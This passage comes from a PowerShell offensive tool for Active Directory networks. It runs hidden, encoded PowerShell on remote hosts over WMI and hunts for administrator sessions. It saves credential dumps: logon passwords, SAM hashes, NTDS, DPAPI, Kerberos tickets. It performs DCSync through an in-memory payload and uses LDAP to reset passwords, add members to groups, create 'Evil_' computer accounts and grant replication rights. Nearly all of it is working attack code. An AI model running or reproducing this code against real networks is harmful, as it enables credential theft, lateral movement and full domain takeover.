                        $newClass.Properties.Add("CommandToRun", [System.Management.CimType]::String, $false)
                        $newClass.Put() | Out-Null
                    }

                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred }
                    else { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName }

                    $wmiInstance.GetType() | Out-Null
                    $wmiInstance.CommandToRun = "$Command"
                    $wmiInstance.Put() | Out-Null
                    $InstanceID = $wmiInstance.InstanceID
                    $wmiInstance.Dispose()
                    return $InstanceID
                }

                # Function to retrieve script output
                function GetScriptOutput {
                    param (
                        [string]$ComputerName,
                        [string]$InstanceID
                    )
                    try {
                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $cred }
                        else { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" }
            
                        $encodedResult = $wmiInstance.CommandOutput
                        $wmiInstance.Dispose()
                        $resultBytes = [Convert]::FromBase64String($encodedResult)
                        $result = [System.Text.Encoding]::UTF8.GetString($resultBytes)
                        return $result
                    }
                    catch {
                        return $_.Exception.Message
                    }
                    finally {
                        if ($wmiInstance) {
                            $wmiInstance.Dispose()
                        }
                    }
                }

                # Function to execute a command remotely
                function Invoke-Execution {
                    param (
                        [string]$ComputerName,
                        [string]$Command
                    )

                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command      

                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred }
                    else { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine }

                    if ($process.ReturnValue -eq 0) {
                        $started = Get-Date
                        Do {
                            if ($started.AddMinutes(2) -lt (Get-Date)) {
                                Write-Host "PID: $($process.ProcessId) - Response took too long."
                                break
                            }
    
                            $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
    
                            Start-Sleep -Seconds 1
                        } While ($watcher -ne $null)
                        $scriptOutput = GetScriptOutput -ComputerName $ComputerName -InstanceID $scriptInstanceID
                        return $scriptOutput
                    }
                }

                $scriptInstanceID = Invoke-Class -ComputerName $ComputerName
                if ($scriptInstanceID -eq $null) { return "Error Creating Class" }

                $script = @"
`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun
`$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String
`$result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$result))
Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null
"@

                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
                $result = Invoke-Execution -ComputerName $ComputerName -Command $encodedCommand

                try {
                    Start-Sleep -Seconds 1

                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $cred | Out-Null }
                    else { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null }

                    $Cleanup = "Success"
                }
                Catch {}
                return $result
            }

            function AdminCount {
                param (
                    [string]$UserName,
                    [System.DirectoryServices.DirectorySearcher]$Searcher
                )

                $Searcher.Filter = "(sAMAccountName=$UserName)"
                $Searcher.PropertiesToLoad.Clear()
                $Searcher.PropertiesToLoad.Add("adminCount") > $null

                $user = $Searcher.FindOne()

                if ($user -ne $null) {
                    $adminCount = $user.Properties["adminCount"]
                    if ($adminCount -eq 1) {
                        return $true
                    }
                }
                return $false
            }

            function SessionHunter {
                param($ComputerName, $Command)

                $userSIDs = @()
                $domainCache = @{}
                $Searcher = New-Object System.DirectoryServices.DirectorySearcher
                $adminPresent = $false

                function GetDomainFQDNFromSID {
                    param($sid)
                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
                    $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
            
                    if (-not $domainCache[$objDomain]) {
                        try {
                            $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
                            $domainCache[$objDomain] = $FQDN
                        }
                        catch {
                            return $objDomain
                        }
                    }
                    return $domainCache[$objDomain]
                }

                try {
                    $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
                }
                catch {
                    return
                }

                $userKeys = $remoteRegistry.GetSubKeyNames()

                foreach ($key in $userKeys) {
                    if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                        $userSIDs += $key
                    }
                }

                $remoteRegistry.Close()

                foreach ($sid in $userSIDs) {
                    try {
                        $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                        $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
                        $username = $userTranslation.Value.Split('\')[1]
                
                        if (AdminCount -UserName $username -Searcher $Searcher) {
                            $adminPresent = $true
                            break
                        }
                    }
                    catch {}
                }

                if ($adminPresent) {
                    if ($Command -eq "") {
                        # We can just return as OSinfo was checked earlier in script
                        return "Successful connection PME"
            
                    }
                    elseif ($Command -ne "") {

                        return WMI $ComputerName -command $Command
            
                    }
                }

            }

            SessionHunter -ComputerName $computerName -command $Command

        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        
        [int]$Global:SuccessCount = 0
        
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false

                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    if ($result -eq "Unable to connect") {
                        continue
                    }
                    elseif ($result -eq "Access Denied") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) {
                            continue
                        }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NO RESULTS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }
                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) {
                                continue
                            }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        
        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ################################################ Function: DCSync ##############################################
    ################################################################################################################
    Function Method-DCSync {

        Write-Output ""
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param (
                $computerName,
                $Command,
                $Timeout,
                $Option,
                $Global:Pandemonium,
                $Domain
            )

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 88, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            if (!$connected) {
                $tcpClient.Close()
                return "Unable to connect"
            }
        
            if ($Option -like "*dcsync:*") {
                $SyncUser = $Option.Split(':')[1]
            
                if (-not $SyncUser) { return "Failed to parse option" }

                $Global:Pandemonium | IEX | Out-Null
                $DomainName = $Computername.Substring($Computername.IndexOf(".") + 1)
                $Result = Invoke-Pandemonium -Command "DCSync" -DCSyncUser $SyncUser -Domain $DomainName -DC $computerName
                
        
            }
            else {
            
                $Global:Pandemonium | IEX | Out-Null
                $DomainName = $Computername.Substring($Computername.IndexOf(".") + 1)
                $result = Invoke-NTDS -Domain $DomainName -dc $computerName -SkipCheck
            }
            return $result
        }

        foreach ($computer in [array]$Computers) {

            $ComputerName = $computer.Properties["dnshostname"][0]
            $OS = $computer.Properties["operatingSystem"][0]

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Option).AddArgument($Global:Pandemonium).AddArgument($Domain)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }


        [int]$Global:SuccessCount = 0

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    try {
                        $result = $result.Trim()
                    }
                    catch { }

                    if ($result -eq "Unable to connect") {
                        continue
                    }

                    if ($result -like "*Failed to parse option*") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[-] " `
                            -statusText "Failed to parse ""-option"" value" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    else {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($ShowOutput) {
                            Write-Output ""
                            $result | Write-Output
                        }

                        if ($Option -like "dcsync:*") {
                            $SyncUser = $Option.Split(':')[1]
                            $SyncUser = $SyncUser -replace ('\\', '_')
                            $result | Out-File -FilePath "$DCSyncUser\$SyncUser.$($Domain.ToLower()).txt" -Encoding "ASCII" -Force
                        }
                        else {
                            $result | Out-File -FilePath "$DCSyncFullDump\$($runspace.ComputerName).txt" -Encoding "ASCII" -Force
                        }

                        continue
                    }

                    [void]$runspace.Runspace.Dispose()
                    [void]$runspace.Handle.AsyncWaitHandle.Close()
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        $runspacePool.Close()
        $runspacePool.Dispose()
    }

    ################################################################################################################
    ################################################ Function: LDAP ################################################
    ################################################################################################################
    Function Method-LDAP {
        param ($ComputerName)
        
        Write-host
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout, $Module, $TargetDN, $GroupDN, $SID, $LDAPS, $Timeroast, $ShowOutput)

            function Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }

            $tcpClient = New-Object System.Net.Sockets.TcpClient

            if ($LDAPS) { $asyncResult = $tcpClient.BeginConnect($ComputerName, 636, $null, $null) }
            else { $asyncResult = $tcpClient.BeginConnect($ComputerName, 389, $null, $null) }
            
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            
            if (!$connected) { return "Unable to connect" }

            try {
                try { Add-Type -AssemblyName System.DirectoryServices.Protocols -ErrorAction SilentlyContinue } catch {}

                try {
                    
                    if ($LDAPS) {

                        $LdapIdentifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ComputerName, 636)
                        $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($LdapIdentifier)
                        $LdapConnection.SessionOptions.SecureSocketLayer = $true

                    }

                    else {

                        $LdapIdentifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ComputerName, 389)
                        $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($LdapIdentifier)
                        $LdapConnection.SessionOptions.Sealing = $true
                        $LdapConnection.SessionOptions.Signing = $true

                    }
                    

                    # Bind to test the connection, might have to drop this when authenticating with a certificate?
                    $LdapConnection.Bind()

                }
                
                catch { return "LDAP Failure: $_" }

                if ($Module -eq "whoami") {
                    $WhoamiRequest = New-Object System.DirectoryServices.Protocols.ExtendedRequest("1.3.6.1.4.1.4203.1.11.3")
                    $Response = $LdapConnection.SendRequest($WhoamiRequest)

                    if ($Response.ResponseValue) {
                        $WhoamiResult = [System.Text.Encoding]::UTF8.GetString($Response.ResponseValue)
                        $Identity = $WhoamiResult.Split(':')[1].Trim()
                        $Result = "Authenticated as $Identity"
                        return $Result
                    }
                }

                if ($Module -eq "MAQ") {

                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                    $searchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($SearchBase, "(objectClass=domainDNS)", [System.DirectoryServices.Protocols.SearchScope]::Base, @("ms-DS-MachineAccountQuota"))
        
                    $searchResponse = $LdapConnection.SendRequest($searchRequest)

                    if ($searchResponse.Entries.Count -gt 0) {
                        $entry = $searchResponse.Entries[0]
                        $maq = $entry.Attributes["ms-DS-MachineAccountQuota"][0]
                        return "`nMachine Account Quota: $maq`n"
                
                    }
            
                    else { return "LDAP_MAQ: No domainDNS object found." }
                }

                elseif ($Module -eq "AddSPN") {
                
                    $Value = Get-RandomString
                    $NewSPN = "cifs/$Value.domain.com"
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "servicePrincipalName", $NewSPN)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully set SPN ""cifs/$value.domain.com"" for $TargetDN"

                }

                elseif ($Module -eq "RemoveSPN") {

                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "servicePrincipalName")
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully Unset SPNs for $TargetDN"
                }

                elseif ($Module -eq "AddToGroup") {

                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "member", $TargetDN)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully added $TargetDN to $GroupDN"
                }
            
                elseif ($Module -eq "RemoveFromGroup") {

                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "member", $TargetDN)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[*] Successfully removed $TargetDN from $GroupDN"
            
                }

                elseif ($Module -eq "ToggleAccount") {

                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                
                    $SearchRequest = [System.DirectoryServices.Protocols.SearchRequest]::new($TargetDN, "(|(objectClass=user)(objectClass=computer))", [System.DirectoryServices.Protocols.SearchScope]::Subtree, "userAccountControl")
                    $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
        
                    if ($SearchResponse.Entries.Count -gt 0) {
                        $SearchResultEntry = $SearchResponse.Entries[0]
                        $UserStatus = $SearchResultEntry.Attributes["userAccountControl"][0]
        
                        [int]$UserAccountControl = [int]($SearchResultEntry.Attributes["userAccountControl"][0].ToString())
                        [int]$AccountDisable = 0x0002;
        
                        # Check if account is disabled and toggle status
                        if (($UserAccountControl -band $AccountDisable) -gt 0) {
        
                            # Currently disabled - enable it (bitwise AND with NOT flag)
                            $UserAccountControl = $UserAccountControl -band (-bnot $AccountDisable)
        
                            $UAC = $CurrentUAC -band (-bnot 0x0002)
                            $UAC = $UAC.ToString()
        
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
                            $LdapConnection.SendRequest($ModifyRequest) > $null
        
                            return "[*] Enabled Account $TargetDN"
                        }
                    
                        else {
        
                            # Currently enabled - disable it (bitwise OR with flag)
                            $UserAccountControl = $UserAccountControl -bor $AccountDisable
        
                            $UAC = $CurrentUAC -bxor 0x0002
                            $UAC = $UAC.ToString()
        
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
                            $LdapConnection.SendRequest($ModifyRequest) > $null
        
                            return "[*] Disabled Account $TargetDN"
                        }
                    }
                
                    else { throw "DistinguishedName $TargetDN not found" }
                }

                elseif ($Module -eq "ResetPassword") {
                
                    $NewPassword = Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    $NewPasswordBytes = [System.Text.Encoding]::Unicode.GetBytes('"' + $NewPassword + '"')           
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "unicodePwd", $NewPasswordBytes)
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                
                    return "[*] Successfully reset ""$TargetDN"" password to $NewPassword"

                }

                elseif ($Module -eq "AddComputer") {
                
                    function Get-RandomComputerName { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 4 | ForEach-Object { [char]$_ }) }

                    $PartialComputerName = Get-RandomComputerName
                    $ComputerName = "Evil_$PartialComputerName"

                    $ComputerPassword = Get-RandomString
        
                    $Password = [System.Text.Encoding]::Unicode.GetBytes('"' + $ComputerPassword + '"')
                    $UnicodePwd = [byte[]]$Password
        
                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                    $Domain = ($SearchBase -split ',' -replace '^DC=', '' -join '.')
                    $ComputerHostname = $ComputerName.TrimEnd('$')
                    [string]$ComputerDN = "CN=$ComputerHostname,CN=Computers,$SearchBase"
        
                    $Spns = @("HOST/$ComputerHostname", "HOST/$ComputerHostname.$Domain", "RestrictedKrbHost/$ComputerHostname", "RestrictedKrbHost/$ComputerHostname.$Domain")
        
                    $AddRequest = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
                    $AddRequest.DistinguishedName = $ComputerDN        
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass", "Computer")) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "SamAccountName", "$ComputerHostname$")) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl", "4096")) > $null  # Normal computer account
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "DnsHostName", "$ComputerHostname.$Domain")) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "ServicePrincipalName", $Spns)) > $null
                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "unicodePwd", $UnicodePwd)) > $null
        
                    $LdapConnection.SendRequest($AddRequest) > $null
        
                    return "[*] Added Computer to $Domain! `n`n[*] Name     : $ComputerName `n[*] Pass     : $ComputerPassword `n[*] DN       : $ComputerDN"
        
                    $ComputerResults = New-Object PSObject
                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ComputerName
                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $ComputerPassword
                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "DN" -Value $ComputerDN
                    $ComputerResults | FT -AutoSize
            

                }

                elseif ($Module -eq "RemoveComputer") {
       
                    # This should ideally validate we are actually removing a computer object
                    $DeleteRequest = New-Object System.DirectoryServices.Protocols.DeleteRequest($TargetDN)
                    $LdapConnection.SendRequest($DeleteRequest) > $null
        
                    return "[*] Successfully removed ""$TargetDN"" from the domain."

                }

                elseif ($Module -eq "Elevate") {
            
                    try {
                
                        $ObjectToElevate = $TargetDN
                
                        $Result = ""
                        $Result += "[*] Retrieving SID of user $UserToElevate`n"
                
                        $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($ObjectToElevate, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "objectSid")
            	
                        try {
                    
                            $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
            		
                            if ($SearchResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { throw "Failed to retrieve user SID: $($userResponse.ResultCode)" }
                            $UserEntry = $SearchResponse.Entries[0]
                            $UserSidBytes = $UserEntry.Attributes["objectSid"][0]
                            $UserSid = New-Object System.Security.Principal.SecurityIdentifier($UserSidBytes, 0)
                    
                            $Result += "[*] User SID: $($UserSid.Value)`n"
                        }
                
                        catch { $Result += "[!] Error retrieving user SID: $_`n" ; return $Result }
        	
                        $DomainDN = ($ObjectToElevate -split ',' | Where-Object { $_ -like 'DC=*' }) -join ','
                        $Result += "[*] Domain DN: $DomainDN`n"
        	
                        # Retrieve domain's security descriptor
                        $Result += "[*] Retrieving security descriptor for domain $DomainDN`n"
                        $SearchDomainRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($DomainDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "nTSecurityDescriptor")
        	
                        $DomainResponse = $LdapConnection.SendRequest($SearchDomainRequest)
            	
                        if ($DomainResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "Failed to retrieve domain security descriptor: $($DomainResponse.ResultCode)" }
        	
                        $DomainEntry = $DomainResponse.Entries[0]
